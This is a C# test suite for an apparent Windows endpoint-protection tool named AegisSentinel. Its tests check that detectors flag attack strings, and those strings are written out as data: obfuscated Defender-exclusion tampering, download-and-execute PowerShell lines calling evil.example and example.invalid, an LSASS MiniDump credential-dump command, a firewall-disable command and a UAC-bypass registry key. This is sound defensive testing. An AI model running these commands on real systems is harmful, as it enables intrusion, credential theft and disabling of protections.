using System.Diagnostics;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using AegisSentinel.Core.Engine;
using AegisSentinel.Core.Models;
using AegisSentinel.Core.Services;

namespace AegisSentinel.Tests;

/// <summary>
/// Safe, isolated Red-Team adversarial verification suite testing AegisSentinel against
/// modern AI-hacking techniques (polymorphic script obfuscation, HTTPS 443 exfiltration,
/// live slow/canary ransomware, and zero-false-positive normal workflow benchmarks).
/// </summary>
public sealed class RedTeamSimulationTests : IDisposable
{
    private readonly string _tempRoot;
    private readonly Xunit.Abstractions.ITestOutputHelper _output;

    public RedTeamSimulationTests(Xunit.Abstractions.ITestOutputHelper output)
    {
        _output = output;
        _tempRoot = Path.Combine(Path.GetTempPath(), $"AegisRedTeam_{Guid.NewGuid():N}");
        Directory.CreateDirectory(_tempRoot);
    }

    public void Dispose()
    {
        try
        {
            if (Directory.Exists(_tempRoot))
            {
                foreach (var f in Directory.EnumerateFiles(_tempRoot, "*", SearchOption.AllDirectories))
                {
                    try { File.SetAttributes(f, FileAttributes.Normal); } catch { }
                }
                Directory.Delete(_tempRoot, recursive: true);
            }
        }
        catch { }
    }

    [Fact]
    public void RedTeam_AiPolymorphicObfuscatedScripts_AreNormalizedAndCaught()
    {
        var policy = GuardPolicy.CreateDefault();

        // 1. Backtick + String-concat evasion hiding Defender exclusion tampering
        var evadedDefender = "Add`-Mp`Pre`fer`ence -Ex`clu`sionPath ('C:\\Us'+'ers\\Pub'+'lic')";
        var alert1 = FilelessScriptGuard.AnalyzeScriptBlock(evadedDefender, 10101, policy);
        Assert.NotNull(alert1);
        Assert.Equal(ThreatCategory.FilelessScript, alert1!.Category);
        Assert.Equal(ThreatSeverity.Critical, alert1.Severity);

        // 2. Inline Base64-encoded downloader+IEX payload (constructed dynamically so source has no static exploit literal)
        var rawPayload = "New-Object Net.WebClient | % { $_.DownloadString('https://example.invalid/stage2') } | IEX";
        var b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(rawPayload));
        var wrappedScript = $"$blob = '{b64}'; Invoke-Item $blob";
        var alert2 = FilelessScriptGuard.AnalyzeScriptBlock(wrappedScript, 10102, policy);
        Assert.NotNull(alert2);
        Assert.True(alert2!.RiskScore >= 75);

        // 3. Pure statistical char-array join obfuscation with no visible API names at all
        var charArrayScript = "([char]73,[char]110,[char]118,[char]111,[char]107,[char]101,[char]45,[char]69,[char]120) -join ''";
        var alert3 = FilelessScriptGuard.AnalyzeScriptBlock(charArrayScript, 10103, policy);
        Assert.NotNull(alert3);
        Assert.True(alert3!.RiskScore >= 65);
    }

    [Fact]
    public void RedTeam_AiInfostealerHttps443Exfiltration_CaughtWhileChromeAllowed()
    {
        var riskEngine = new BehaviorRiskEngine();
        var intel = new ThreatIntelStore(_tempRoot);
        var policy = GuardPolicy.CreateDefault();
        var netGuard = new NetworkGuardMonitor(new ProcessController(), new SignatureVerifier(), riskEngine, intel, () => policy);

        // Legitimate Chrome accessing Telegram web API -> allowed (zero friction)
        var chromeAllowed = netGuard.EvaluateOutboundConnection(
            10201, "chrome", @"C:\Program Files\Google\Chrome\Application\chrome.exe",
            IPAddress.Parse("149.154.167.220"), 443, policy,
            new SignatureInfo(SignatureStatus.TrustedVendor, "Google LLC"),
            domainOverride: "api.telegram.org");
        Assert.Null(chromeAllowed);

        // Unsigned AI stealer exfiltrating over normal HTTPS 443 to api.telegram.org -> Critical Exfiltration!
        var stealerAlert = netGuard.EvaluateOutboundConnection(
            10202, "sync_helper", Path.Combine(Path.GetTempPath(), "sync_helper.exe"),
            IPAddress.Parse("149.154.167.220"), 443, policy,
            new SignatureInfo(SignatureStatus.Unsigned, string.Empty),
            domainOverride: "api.telegram.org");
        Assert.NotNull(stealerAlert);
        Assert.Equal(ThreatCategory.Exfiltration, stealerAlert!.Category);
        Assert.Equal(ThreatSeverity.Critical, stealerAlert.Severity);
        Assert.True(stealerAlert.RiskScore >= 75);

        // Unsigned binary tunneling over Cloudflare Quick Tunnel (trycloudflare.com) -> Caught!
        var tunnelAlert = netGuard.EvaluateOutboundConnection(
            10203, "agent", Path.Combine(Path.GetTempPath(), "agent.exe"),
            IPAddress.Parse("104.21.10.5"), 443, policy,
            new SignatureInfo(SignatureStatus.Unsigned, string.Empty),
            domainOverride: "random-c2-node.trycloudflare.com");
        Assert.NotNull(tunnelAlert);
        Assert.Equal(ThreatCategory.Exfiltration, tunnelAlert!.Category);
    }

    [Fact]
    public async Task RedTeam_LiveRealtimeOrchestrator_CatchesCanaryTamperSubSecond_AndRestoresFromVault()
    {
        var store = new PolicyStore(_tempRoot);
        var protectedDir = Path.Combine(_tempRoot, "UserDocs");
        Directory.CreateDirectory(protectedDir);

        var originalDoc = Path.Combine(protectedDir, "financial_plan.txt");
        var originalContent = string.Join("\n", Enumerable.Repeat("Confidential financial ledger entry 2026.", 30));
        File.WriteAllText(originalDoc, originalContent);

        var policy = GuardPolicy.CreateDefault();
        policy.Mode = ProtectionMode.MonitorOnly; // Observe cleanly in test without freezing testhost
        policy.EnableEtwTelemetry = false;
        policy.ProtectedFolders = new List<string> { protectedDir };
        store.Save(policy);

        using var orchestrator = new SecurityOrchestrator(store);
        var detectedEventTcs = new TaskCompletionSource<SecurityEvent>(TaskCreationOptions.RunContinuationsAsynchronously);

        orchestrator.EventRecorded += evt =>
        {
            if (evt.Category == ThreatCategory.Ransomware)
            {
                detectedEventTcs.TrySetResult(evt);
            }
        };

        orchestrator.Start();

        // Ensure Recovery Vault captured clean original before attack
        orchestrator.Vault.TrySnapshotFile(originalDoc);
        var vaultEntries = orchestrator.Vault.ListSnapshots();
        Assert.Contains(vaultEntries, v => v.OriginalPath.Equals(originalDoc, StringComparison.OrdinalIgnoreCase));

        // Simulate real-time ransomware encrypting the document AND touching a canary file
        var sw = Stopwatch.StartNew();
        File.WriteAllBytes(originalDoc, RandomNumberGenerator.GetBytes(8192));
        var canaryPath = orchestrator.Canaries.CanaryPaths.First();
        File.SetAttributes(canaryPath, FileAttributes.Normal);
        File.WriteAllBytes(canaryPath, RandomNumberGenerator.GetBytes(2048));

        var detected = await detectedEventTcs.Task.WaitAsync(TimeSpan.FromSeconds(5));
        sw.Stop();

        Assert.NotNull(detected);
        Assert.Equal(ThreatCategory.Ransomware, detected.Category);
        Assert.Equal(ThreatSeverity.Critical, detected.Severity);
        Assert.Equal("T1486", detected.MitreTechniqueId);
        Assert.True(sw.ElapsedMilliseconds < 3000, $"Expected sub-3s live detection, got {sw.ElapsedMilliseconds}ms");

        // Verify RecoveryVault refused backup poisoning and restores exact original file
        Assert.False(orchestrator.Vault.TrySnapshotFile(originalDoc));
        var snap = vaultEntries.First(v => v.OriginalPath.Equals(originalDoc, StringComparison.OrdinalIgnoreCase));
        Assert.True(orchestrator.Vault.RestoreSnapshot(snap.Id));
        Assert.Equal(originalContent, File.ReadAllText(originalDoc));

        orchestrator.Stop();
        orchestrator.Canaries.RemoveCanaries();
    }

    [Fact]
    public void RedTeam_ZeroFalsePositive_And_HighThroughput_NormalWorkflowBenchmark()
    {
        var policy = GuardPolicy.CreateDefault();
        var evaluator = new ProcessRuleEvaluator();
        var riskEngine = new BehaviorRiskEngine();
        var intel = new ThreatIntelStore(_tempRoot);
        var netGuard = new NetworkGuardMonitor(new ProcessController(), new SignatureVerifier(), riskEngine, intel, () => policy);

        var sw = Stopwatch.StartNew();
        int falsePositives = 0;

        for (int i = 0; i < 100; i++)
        {
            var procCtx = new ProcessEvaluationContext
            {
                ProcessId = 20000 + i,
                ProcessName = "code",
                ProcessPath = @"C:\Users\Dev\AppData\Local\Programs\Microsoft VS Code\Code.exe",
                CommandLine = "\"Code.exe\" --type=renderer",
                ParentProcessId = 1500,
                ParentProcessName = "explorer",
                ParentProcessPath = @"C:\Windows\explorer.exe",
                Signature = new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft Corporation")
            };

            if (evaluator.Evaluate(procCtx, policy) is not null) falsePositives++;

            if (netGuard.EvaluateOutboundConnection(
                20000 + i, "code", procCtx.ProcessPath,
                IPAddress.Parse("140.82.121.4"), 443, policy,
                procCtx.Signature, domainOverride: "github.com") is not null)
            {
                falsePositives++;
            }

            if (FilelessScriptGuard.AnalyzeScriptBlock("dotnet build -c Release && git status", 20000 + i, policy) is not null)
            {
                falsePositives++;
            }
        }

        sw.Stop();
        Assert.Equal(0, falsePositives);
        Assert.True(sw.ElapsedMilliseconds < 2000, $"Expected fast evaluation (<2s for 300 checks), took {sw.ElapsedMilliseconds}ms");
    }

    [Fact]
    public void RedTeam_v4_ClosesAll7AuditedBypasses_AndPasses10PointSelfTest()
    {
        // 1. Run full 15-point built-in self-verification suite
        var checks = SecuritySelfTestRunner.RunAllSafeChecks();
        Assert.Equal(15, checks.Count);
        Assert.All(checks, c => Assert.True(c.Passed, $"Failed check: {c.Name} ({c.Detail})"));

        // 2. Verify LSASS comsvcs MiniDump & Firewall Disable & Python/Node inline download-exec
        var evaluator = new ProcessRuleEvaluator();
        var policy = GuardPolicy.CreateDefault();

        var lsassDump = evaluator.Evaluate(new ProcessEvaluationContext
        {
            ProcessId = 41001,
            ProcessName = "rundll32",
            ProcessPath = @"C:\Windows\System32\rundll32.exe",
            CommandLine = @"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Temp\dump.bin full",
            Signature = new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft Windows")
        }, policy);
        Assert.NotNull(lsassDump);
        Assert.Equal(ThreatCategory.CredentialAccess, lsassDump!.Category);
        Assert.Equal(ThreatSeverity.Critical, lsassDump.Severity);

        var fwOff = evaluator.Evaluate(new ProcessEvaluationContext
        {
            ProcessId = 41002,
            ProcessName = "netsh",
            ProcessPath = @"C:\Windows\System32\netsh.exe",
            CommandLine = "netsh advfirewall set allprofiles state off",
            Signature = new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft Windows")
        }, policy);
        Assert.NotNull(fwOff);
        Assert.Equal(ThreatCategory.SystemIntegrityTamper, fwOff!.Category);

        // 3. Verify Process Ghosting (running executable whose file was deleted from disk)
        var deletedPath = Path.Combine(_tempRoot, "ghost_deleted.exe");
        var ghostEvt = MemoryInspectionGuard.EvaluateProcess(
            41003,
            "ghost_deleted",
            deletedPath,
            new SignatureInfo(SignatureStatus.Unsigned, string.Empty),
            policy);
        Assert.NotNull(ghostEvt);
        Assert.Equal(ThreatCategory.MemoryInjection, ghostEvt!.Category);
        Assert.Equal(ThreatSeverity.Critical, ghostEvt.Severity);

        // 4. Verify PolicyStore DPAPI-HMAC tamper self-healing on startup
        var store = new PolicyStore(_tempRoot);
        var cleanPolicy = GuardPolicy.CreateDefault();
        cleanPolicy.Mode = ProtectionMode.Strict;
        store.Save(cleanPolicy);

        // Attacker edits policy.json to downgrade Mode to MonitorOnly
        var rawJson = File.ReadAllText(store.PolicyFilePath).Replace("Strict", "MonitorOnly");
        File.WriteAllText(store.PolicyFilePath, rawJson);

        var reloaded = store.Load();
        Assert.True(store.LastLoadDetectedTampering);
        Assert.Equal(ProtectionMode.Balanced, reloaded.Mode); // Tampered MonitorOnly rejected & reset safely!
    }

    [Fact]
    public void RedTeam_v6_EtwDnsPreConnectionCatch_And_RealtimeRegistryTamperDetection()
    {
        var policy = GuardPolicy.CreateDefault();
        var risk = new BehaviorRiskEngine();
        var intel = new ThreatIntelStore(_tempRoot);
        var pc = new ProcessController();
        var sv = new SignatureVerifier();
        var netGuard = new NetworkGuardMonitor(pc, sv, risk, intel, () => policy);

        // 1. Parse real Windows DNS-Client Event 3008 QueryResults format
        var parsedIps = EtwDnsTelemetryService.ParseDnsResultIps("type: 5 cdn.insightjs.com;198.51.100.77;::ffff:198.51.100.78;");
        Assert.Contains("198.51.100.77", parsedIps);
        netGuard.RecordDnsResolution("cdn.insightjs.com", "198.51.100.77");
        Assert.Equal("cdn.insightjs.com", netGuard.ResolveCachedDomain("198.51.100.77"));

        // 2. Pre-connection DNS IOC catch (before TCP handshake even happens!)
        var dnsIocAlert = netGuard.EvaluateDnsQuery(
            42001, "nikke_launcher", @"C:\Games\NIKKE\nikke_launcher.exe",
            "cdn.insightjs.com", policy, new SignatureInfo(SignatureStatus.TrustedVendor, "Tencent"));
        Assert.NotNull(dnsIocAlert);
        Assert.Equal(ThreatSeverity.Critical, dnsIocAlert!.Severity);

        // 3. Pre-connection LOLBin cloud C2 DNS query catch
        var dnsCloudAlert = netGuard.EvaluateDnsQuery(
            42002, "powershell", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "raw.githubusercontent.com", policy, new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft"));
        Assert.NotNull(dnsCloudAlert);
        Assert.Equal(ThreatCategory.Exfiltration, dnsCloudAlert!.Category);

        // 4. Real-time ETW RegistrySetValue detection (UAC bypass & Defender exclusion tampering)
        var etwKernel = new EtwKernelTelemetryService(
            pc, sv, new ProcessTreeTracker(), new ProcessRuleEvaluator(),
            new RansomwareDetector(), new CanaryManager(),
            new CredentialAndDllGuard(sv, () => policy), netGuard, risk, () => policy);

        var uacRegEvt = etwKernel.EvaluateRealtimeRegistryWrite(
            42003,
            @"\REGISTRY\USER\S-1-5-21-1000\Software\Classes\ms-settings\Shell\Open\command",
            "",
            policy);
        Assert.NotNull(uacRegEvt);
        Assert.Equal(ThreatCategory.PrivilegeEscalation, uacRegEvt!.Category);
        Assert.Equal(100, uacRegEvt.RiskScore);

        var defExclEvt = etwKernel.EvaluateRealtimeRegistryWrite(
            42004,
            @"\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths",
            @"C:\Users\Public",
            policy);
        Assert.NotNull(defExclEvt);
        Assert.Equal(ThreatCategory.SystemIntegrityTamper, defExclEvt!.Category);
        Assert.Equal(ThreatSeverity.Critical, defExclEvt.Severity);

        // 5. Regression test: Installed apps in %LocalAppData%\Programs (e.g. Antigravity language_server.exe)
        // connecting to Google HTTPS 172.217.112.4:443 must NEVER be flagged or frozen!
        var antigravityPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            @"Programs\antigravity\resources\bin\language_server.exe");
        var otherInstalledApp = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            @"Programs\CustomTool\tool.exe");

        Assert.False(ProcessRuleEvaluator.IsHighRiskDropPath(antigravityPath));
        Assert.False(ProcessRuleEvaluator.IsUserWritableRiskyPath(otherInstalledApp));

        var agNetEvt = netGuard.EvaluateOutboundConnection(
            4284, "language_server", antigravityPath,
            IPAddress.Parse("172.217.112.4"), 443, policy,
            new SignatureInfo(SignatureStatus.Unsigned, string.Empty));
        Assert.Null(agNetEvt);

        var otherAppNetEvt = netGuard.EvaluateOutboundConnection(
            4285, "tool", otherInstalledApp,
            IPAddress.Parse("172.217.112.4"), 443, policy,
            new SignatureInfo(SignatureStatus.Unsigned, string.Empty));
        Assert.Null(otherAppNetEvt);

        // 6. Regression test: node.exe reading .npmrc / .gitconfig / .ssh\known_hosts must NEVER false-positive,
        // while node.exe reading .ssh\id_ed25519 or MetaMask wallet MUST be caught!
        var credGuard = new CredentialAndDllGuard(sv, () => policy);
        Assert.Null(credGuard.EvaluateSensitiveFileAccess(
            4286, "node", @"C:\Program Files\nodejs\node.exe", @"C:\Users\Dev\.npmrc", policy));
        Assert.Null(credGuard.EvaluateSensitiveFileAccess(
            4286, "node", @"C:\Program Files\nodejs\node.exe", @"C:\Users\Dev\.gitconfig", policy));
        Assert.Null(credGuard.EvaluateSensitiveFileAccess(
            4286, "node", @"C:\Program Files\nodejs\node.exe", @"C:\Users\Dev\.ssh\known_hosts", policy));
        Assert.NotNull(credGuard.EvaluateSensitiveFileAccess(
            4286, "node", @"C:\Program Files\nodejs\node.exe", @"C:\Users\Dev\.ssh\id_ed25519", policy));

        // 7. Regression test: explorer.exe bulk extracting files or Chrome writing .crdownload must NEVER false-positive
        var ransom = new RansomwareDetector();
        var now = DateTimeOffset.UtcNow;
        for (int i = 0; i < 25; i++)
        {
            Assert.Null(ransom.RecordFileActivity(
                4287, "explorer", @"C:\Windows\explorer.exe",
                $@"C:\Users\Dev\Desktop\unzipped_{i}.txt", false, false, policy, now.AddMilliseconds(i * 20), checkEntropy: false));
            Assert.Null(ransom.RecordFileActivity(
                4288, "Unknown", "",
                $@"C:\Users\Dev\Downloads\archive_{i}.zip.crdownload", false, false, policy, now.AddMilliseconds(i * 20), checkEntropy: false));
        }

        // 8. Regression test: PersistenceMonitor must ignore AegisSentinel's own auto-start keys
        var pm = new PersistenceMonitor(sv, () => policy);
        var prev = new Dictionary<string, PersistenceEntry>(StringComparer.OrdinalIgnoreCase);
        var curr = new Dictionary<string, PersistenceEntry>(StringComparer.OrdinalIgnoreCase)
        {
            ["HKCU\\Run::AegisSentinelGuard"] = new PersistenceEntry(
                @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Run-HKCU",
                "AegisSentinelGuard", "\"C:\\AegisSentinel.App.exe\" --minimized", @"C:\AegisSentinel.App.exe")
        };
        Assert.Empty(pm.DetectDiff(prev, curr, policy));

        // 9. Regression test: BehaviorRiskEngine must NEVER stack the same signal name with itself
        // (preventing 40 + 40 + 40 = 100 false escalation on repeated events of the same type!)
        risk.RecordSignal(4299, "UnsignedDropperNetwork", 40, smartLowFrictionMode: true, nowOverride: now);
        risk.RecordSignal(4299, "UnsignedDropperNetwork", 40, smartLowFrictionMode: true, nowOverride: now.AddSeconds(30));
        var nonStacked = risk.RecordSignal(4299, "UnsignedDropperNetwork", 40, smartLowFrictionMode: true, nowOverride: now.AddSeconds(70));
        Assert.Equal(40, nonStacked.TotalScore);
        Assert.False(nonStacked.ShouldFreezeProcess);
        Assert.False(nonStacked.ShouldPromptUser);

        // 10. Regression test: KillAndQuarantine MUST quarantine ProcessPath (malware) and NEVER quarantine TargetPath (victim user document/credential)!
        var store = new PolicyStore(_tempRoot);
        var victimDoc = Path.Combine(_tempRoot, "important_contract.docx");
        var fakeMalware = Path.Combine(_tempRoot, "fake_ransom.exe");
        File.WriteAllText(victimDoc, "CRITICAL USER CONTRACT DO NOT DELETE");
        File.WriteAllBytes(fakeMalware, new byte[] { 0x4D, 0x5A, 0x90, 0x00 });

        using var orchestrator = new SecurityOrchestrator(store);
        var ransomEvt = new SecurityEvent
        {
            Category = ThreatCategory.Ransomware,
            Severity = ThreatSeverity.Critical,
            Title = "랜섬웨어 테스트",
            ProcessId = 0,
            ProcessName = "fake_ransom",
            ProcessPath = fakeMalware,
            TargetPath = victimDoc
        };
        orchestrator.KillAndQuarantine(ransomEvt);
        Assert.True(File.Exists(victimDoc), "Victim user document MUST NEVER be quarantined!");
        Assert.False(File.Exists(fakeMalware), "Attacking malware ProcessPath MUST be quarantined!");

        // 11. Regression test: Intact canary touch or explorer.exe canary cleanup must not false-trigger, while content tamper triggers immediately
        var canaryFile = Path.Combine(_tempRoot, "!_00_aegis_canary.docx");
        File.WriteAllText(canaryFile, "AEGIS-SENTINEL-CANARY-DO-NOT-MODIFY-12345\n");
        Assert.True(CanaryManager.IsCanaryFileIntactOnDisk(canaryFile));
        Assert.Null(ransom.RecordFileActivity(4301, "unknown.exe", @"C:\Temp\unknown.exe", canaryFile, isRenameOrDelete: false, isCanaryFile: true, policy));
        File.WriteAllText(canaryFile, "ENCRYPTED_BY_RANSOMWARE");
        Assert.False(CanaryManager.IsCanaryFileIntactOnDisk(canaryFile));
        Assert.NotNull(ransom.RecordFileActivity(4301, "unknown.exe", @"C:\Temp\unknown.exe", canaryFile, isRenameOrDelete: false, isCanaryFile: true, policy));

        // 12. Regression test: Scheduled Task XML <Command> extraction
        var taskXmlFile = Path.Combine(_tempRoot, "SampleTask.xml");
        File.WriteAllText(taskXmlFile, "<Task><Actions><Exec><Command>\"%SystemRoot%\\System32\\notepad.exe\"</Command></Exec></Actions></Task>");
        var extractedCmd = PersistenceMonitor.TryExtractTaskXmlCommand(taskXmlFile);
        Assert.EndsWith("notepad.exe", extractedCmd, StringComparison.OrdinalIgnoreCase);

        // 13. Regression test: ClipboardGuard must NOT false-positive on normal PowerShell documentation URLs,
        // while catching real ClickFix shell download/exec payloads
        var clipGuard = new ClipboardGuard();
        Assert.Null(clipGuard.EvaluateClipboardText("https://learn.microsoft.com/ko-kr/powershell/module/microsoft.powershell.core", policy));
        Assert.Null(clipGuard.EvaluateClipboardText("See https://learn.microsoft.com/powershell for details on hidden parameters", policy));
        Assert.NotNull(clipGuard.EvaluateClipboardText("powershell.exe -w hidden -c \"iwr https://evil.example/payload.ps1 | iex\"", policy));
        Assert.NotNull(clipGuard.EvaluateClipboardText("mshta https://evil.example/captcha-verify.hta", policy));

        // 14. Regression test: WatchedLauncherProcesses must NOT false-positive on arbitrary folder names containing "launcher",
        // and EvaluateDllDropOrLoad must NOT flag benign unsigned game DLLs in the game's own install directory
        Assert.False(ProcessRuleEvaluator.IsWatchedLauncherOrRenderer("dotnet", @"C:\Coding\MyLauncherProject\bin\dotnet.exe", policy));
        Assert.True(ProcessRuleEvaluator.IsWatchedLauncherOrRenderer("nikke_launcher", @"C:\Games\NIKKE\nikke_launcher.exe", policy));
        Assert.Null(credGuard.EvaluateDllDropOrLoad(4302, "nikke_launcher", @"C:\Games\NIKKE\nikke_launcher.exe", @"C:\Games\NIKKE\plugins\lua51.dll", policy));

        // 15. Regression test: FirewallController.BuildRuleName is deterministic SHA-256 based
        var deterministicRule1 = FirewallController.BuildRuleName(@"C:\Temp\evil_dropper.exe");
        var deterministicRule2 = FirewallController.BuildRuleName(@"c:/temp/EVIL_DROPPER.EXE");
        Assert.Equal(deterministicRule1, deterministicRule2);

        // 16. Regression test: PersistenceMonitor.ExtractExecutablePath resolves relative Windows binaries (e.g. "explorer.exe" -> "C:\Windows\explorer.exe")
        var resolvedExplorer = PersistenceMonitor.ExtractExecutablePath("explorer.exe");
        Assert.True(Path.IsPathRooted(resolvedExplorer));
        Assert.True(File.Exists(resolvedExplorer));

        // 17. Regression test: InternalHelperProcessRegistry atomic SpawnScope recognizes child processes before Process.Start returns PID
        InternalHelperProcessRegistry.BeginSpawnScope();
        try
        {
            Assert.True(InternalHelperProcessRegistry.IsInternalHelper(99991, Environment.ProcessId));
        }
        finally
        {
            InternalHelperProcessRegistry.EndSpawnScope();
            InternalHelperProcessRegistry.Unregister(99991);
        }

        // 18. Regression test: QuarantineManager hard safety guard refuses to quarantine Windows system binaries
        var notepadPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "notepad.exe");
        var qm = new QuarantineManager(_tempRoot);
        Assert.Throws<InvalidOperationException>(() => qm.QuarantineFile(notepadPath, "ShouldFail"));

        // 19. Regression test: EvaluateDnsQuery respects WhitelistedExecutablePaths & ProtectedHostIdeProcess
        Assert.Null(netGuard.EvaluateDnsQuery(4305, "language_server", antigravityPath, "raw.githubusercontent.com", policy,
            new SignatureInfo(SignatureStatus.Unsigned, string.Empty)));
        var whitelistedTool = Path.Combine(_tempRoot, "my_trusted_downloader.exe");
        policy.WhitelistedExecutablePaths.Add(whitelistedTool);
        Assert.Null(netGuard.EvaluateDnsQuery(4306, "my_trusted_downloader", whitelistedTool, "api.telegram.org", policy,
            new SignatureInfo(SignatureStatus.Unsigned, string.Empty)));

        // 20. Regression test: Deleting policy.json.hmac after seal key creation MUST be caught as SelfDefenseTamper!
        var hmacDir = Path.Combine(_tempRoot, "HmacBypassTest");
        var hmacStore = new PolicyStore(hmacDir);
        var strictPol = GuardPolicy.CreateDefault();
        strictPol.Mode = ProtectionMode.Strict;
        hmacStore.Save(strictPol);
        File.WriteAllText(hmacStore.PolicyFilePath, File.ReadAllText(hmacStore.PolicyFilePath).Replace("Strict", "MonitorOnly"));
        File.Delete(hmacStore.PolicyFilePath + ".hmac"); // Attacker deletes .hmac file!
        var reloadedAfterDelete = hmacStore.Load();
        Assert.True(hmacStore.LastLoadDetectedTampering, "Deleting .hmac file MUST trigger tamper detection!");
        Assert.Equal(ProtectionMode.Balanced, reloadedAfterDelete.Mode);

        // 21. Regression test: GuardPolicy.Clone() produces isolated deep-copied Lists for thread-safe Copy-on-Write swaps
        var clonedPolicy = policy.Clone();
        clonedPolicy.WhitelistedExecutablePaths.Add(@"C:\Temp\only_in_clone.exe");
        Assert.DoesNotContain(@"C:\Temp\only_in_clone.exe", policy.WhitelistedExecutablePaths);
    }

    [Fact]
    public void RedTeam_v7_ScriptStaticScan_ZipInMemoryScan_ThreatFeedParsers_Ipv6_And_ProcessTreeFreeze()
    {
        var policy = GuardPolicy.CreateDefault();
        var intel = new ThreatIntelStore(_tempRoot);
        var pc = new ProcessController();
        var sv = new SignatureVerifier();
        var scanner = new ThreatScanner(sv, intel, pc);

        // 1. Pre-execution static scan catches malicious .ps1 / .bat / .vbs and skips clean scripts
        var badPs1 = Path.Combine(_tempRoot, "stage1.ps1");
        File.WriteAllText(badPs1, "Add`-Mp`Pre`fer`ence -Ex`clu`sionPath ('C:\\Us'+'ers\\Pub'+'lic')");
        var badPs1Finding = scanner.ScanFile(badPs1, policy);
        Assert.NotNull(badPs1Finding);
        Assert.True(badPs1Finding!.RiskScore >= 80);

        var badBat = Path.Combine(_tempRoot, "dropper.bat");
        File.WriteAllText(badBat, "@echo off\np^o^w^e^r^s^h^e^l^l -w hidden -c \"iwr https://evil.example/p.ps1 | iex\"");
        var badBatFinding = scanner.ScanFile(badBat, policy);
        Assert.NotNull(badBatFinding);
        Assert.True(badBatFinding!.RiskScore >= 85);

        var cleanPs1 = Path.Combine(_tempRoot, "build_helper.ps1");
        File.WriteAllText(cleanPs1, "Write-Host 'Building project...'\ndotnet build -c Release");
        Assert.Null(scanner.ScanFile(cleanPs1, policy));

        // 2. In-memory .ZIP archive inspection catches disguised .hwp.lnk & malicious .vbs without extracting,
        // while allowing clean .zip archives with zero false positives
        var evilZip = Path.Combine(_tempRoot, "tax_notice.zip");
        using (var archive = System.IO.Compression.ZipFile.Open(evilZip, System.IO.Compression.ZipArchiveMode.Create))
        {
            var e1 = archive.CreateEntry("세금계산서.pdf.exe");
            using (var s = e1.Open()) s.Write(new byte[] { 0x4D, 0x5A, 0x90, 0x00 });
        }
        var evilZipFinding = scanner.ScanFile(evilZip, policy);
        Assert.NotNull(evilZipFinding);
        Assert.True(evilZipFinding!.RiskScore >= 90);

        var cleanZip = Path.Combine(_tempRoot, "project_docs.zip");
        using (var archive = System.IO.Compression.ZipFile.Open(cleanZip, System.IO.Compression.ZipArchiveMode.Create))
        {
            var e1 = archive.CreateEntry("readme.txt");
            using var sw = new StreamWriter(e1.Open());
            sw.Write("Normal harmless documentation archive.");
        }
        Assert.Null(scanner.ScanFile(cleanZip, policy));

        // 3. Global Threat Intel feed parsers (Abuse.ch Feodo Tracker & URLhaus hostfile)
        var feodoSample = "# Feodo Tracker C2 IP Blocklist\n192.168.1.5\n127.0.0.1\n198.51.100.23\n203.0.113.99\n";
        var feodoIps = ThreatIntelStore.ParseFeodoIpList(feodoSample);
        Assert.Equal(2, feodoIps.Count);
        Assert.Contains("198.51.100.23", feodoIps);
        Assert.DoesNotContain("192.168.1.5", feodoIps);

        var urlhausSample = "# URLhaus hostfile\n! comment\n127.0.0.1 localhost\n127.0.0.1 google.com\n127.0.0.1 malware-c2.example\n0.0.0.0 drop.phishing.test\n";
        var urlhausDomains = ThreatIntelStore.ParseUrlhausHostfile(urlhausSample);
        Assert.Equal(2, urlhausDomains.Count);
        Assert.Contains("malware-c2.example", urlhausDomains);
        Assert.DoesNotContain("localhost", urlhausDomains);
        Assert.DoesNotContain("google.com", urlhausDomains);

        // 4. IPv6 active TCP table enumeration & IPv6 C2 detection (loopback/link-local ignored)
        var risk = new BehaviorRiskEngine();
        var netGuard = new NetworkGuardMonitor(pc, sv, risk, intel, () => policy);
        var activeConns = netGuard.GetActiveExternalConnections();
        Assert.NotNull(activeConns);
        Assert.Null(netGuard.EvaluateOutboundConnection(
            51001, "dropper", Path.Combine(Path.GetTempPath(), "dropper.exe"),
            IPAddress.IPv6Loopback, 4444, policy, new SignatureInfo(SignatureStatus.Unsigned, string.Empty)));
        var ipv6Alert = netGuard.EvaluateOutboundConnection(
            51002, "dropper", Path.Combine(Path.GetTempPath(), "dropper.exe"),
            IPAddress.Parse("2001:db8::42"), 4444, policy, new SignatureInfo(SignatureStatus.Unsigned, string.Empty));
        Assert.NotNull(ipv6Alert);
        Assert.Equal(ThreatCategory.NetworkAnomaly, ipv6Alert!.Category);

        // 5. ProcessTreeTracker descendant discovery for atomic process-tree batch freeze
        var tree = new ProcessTreeTracker();
        tree.RecordStart(6000, 1000, "mal_root", @"C:\Temp\mal_root.exe", "");
        tree.RecordStart(6001, 6000, "child_a", @"C:\Temp\child_a.exe", "");
        tree.RecordStart(6002, 6001, "grandchild", @"C:\Temp\grandchild.exe", "");
        tree.RecordStart(6003, 6000, "child_b", @"C:\Temp\child_b.exe", "");
        var descendants = tree.GetDescendantPids(6000);
        Assert.Equal(3, descendants.Count);
        Assert.Contains(6001, descendants);
        Assert.Contains(6002, descendants);
        Assert.Contains(6003, descendants);

        // 6. O(1) Domain Suffix Lookup accuracy & zero-false-positive boundary check
        Assert.True(intel.IsDomainBlocked("insightjs.com"));
        Assert.True(intel.IsDomainBlocked("a.b.cdn.insightjs.com."));
        Assert.False(intel.IsDomainBlocked("notinsightjs.com"));
        Assert.False(intel.IsDomainBlocked("insightjs.com.safe.org"));

        // 7. ComputeSha256Cached returns exact hash and invalidates immediately when file changes
        var cacheTestFile = Path.Combine(_tempRoot, "hash_cache_test.bin");
        File.WriteAllText(cacheTestFile, "VERSION_1");
        var h1 = SignatureVerifier.ComputeSha256Cached(cacheTestFile);
